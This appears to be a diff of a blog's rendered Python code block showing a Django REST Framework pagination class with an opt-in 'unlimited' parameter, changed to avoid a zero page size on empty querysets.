-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> pagination</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PageNumberPagination</span>(pagination.PageNumberPagination):</span><br><span class="line">    page_size_query_param = <span class="string">&quot;page_size&quot;</span></span><br><span class="line">    unlimited_query_param = <span class="string">&quot;unlimited&quot;</span></span><br><span class="line">    unlimited_query_description = (</span><br><span class="line">        <span class="string">&quot;A boolean value to indicate whether return all results.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    unlimited_view_attribute = <span class="string">&quot;pagination_unlimited&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_schema_operation_parameters</span>(<span class="params">self, view</span>):</span><br><span class="line">        parameters = <span class="built_in">super</span>().get_schema_operation_parameters(view)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            parameters.append(</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="variable language_">self</span>.unlimited_query_param,</span><br><span class="line">                    <span class="string">&quot;required&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                    <span class="string">&quot;in&quot;</span>: <span class="string">&quot;query&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="variable language_">self</span>.unlimited_query_description,</span><br><span class="line">                    <span class="string">&quot;schema&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;boolean&quot;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_unlimited</span>(<span class="params">self, request</span>):</span><br><span class="line">        unlimited = request.query_params.get(<span class="variable language_">self</span>.unlimited_query_param, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> unlimited <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;1&quot;</span>, <span class="string">&quot;true&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;0&quot;</span>, <span class="string">&quot;false&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">paginate_queryset</span>(<span class="params">self, queryset, request, view=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.request = request</span><br><span class="line">        unlimited = <span class="variable language_">self</span>.get_unlimited(request)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            unlimited <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">        ):</span><br><span class="line">            page_size = queryset.count()</span><br><span class="line">            paginator = <span class="variable language_">self</span>.django_paginator_class(queryset, page_size)</span><br><span class="line">            <span class="variable language_">self</span>.page = paginator.page(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">list</span>(<span class="variable language_">self</span>.page)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().paginate_queryset(queryset, request, view)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> pagination</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PageNumberPagination</span>(pagination.PageNumberPagination):</span><br><span class="line">    page_size_query_param = <span class="string">&quot;page_size&quot;</span></span><br><span class="line">    unlimited_query_param = <span class="string">&quot;unlimited&quot;</span></span><br><span class="line">    unlimited_query_description = (</span><br><span class="line">        <span class="string">&quot;A boolean value to indicate whether return all results.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    unlimited_view_attribute = <span class="string">&quot;pagination_unlimited&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_schema_operation_parameters</span>(<span class="params">self, view</span>):</span><br><span class="line">        parameters = <span class="built_in">super</span>().get_schema_operation_parameters(view)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            parameters.append(</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="variable language_">self</span>.unlimited_query_param,</span><br><span class="line">                    <span class="string">&quot;required&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                    <span class="string">&quot;in&quot;</span>: <span class="string">&quot;query&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="variable language_">self</span>.unlimited_query_description,</span><br><span class="line">                    <span class="string">&quot;schema&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;boolean&quot;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_unlimited</span>(<span class="params">self, request</span>):</span><br><span class="line">        unlimited = request.query_params.get(<span class="variable language_">self</span>.unlimited_query_param, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> unlimited <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;1&quot;</span>, <span class="string">&quot;true&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;0&quot;</span>, <span class="string">&quot;false&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">paginate_queryset</span>(<span class="params">self, queryset, request, view=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.request = request</span><br><span class="line">        unlimited = <span class="variable language_">self</span>.get_unlimited(request)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            unlimited <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">        ):</span><br><span class="line">            page_size = queryset.count()</span><br><span class="line">            <span class="keyword">if</span> page_size == <span class="number">0</span>:</span><br><span class="line">              page_size = <span class="number">1</span></span><br><span class="line">            paginator = <span class="variable language_">self</span>.django_paginator_class(queryset, page_size)</span><br><span class="line">            <span class="variable language_">self</span>.page = paginator.page(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">list</span>(<span class="variable language_">self</span>.page)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().paginate_queryset(queryset, request, view)</span><br></pre></td></tr></table></figure>
 
 </details>
 
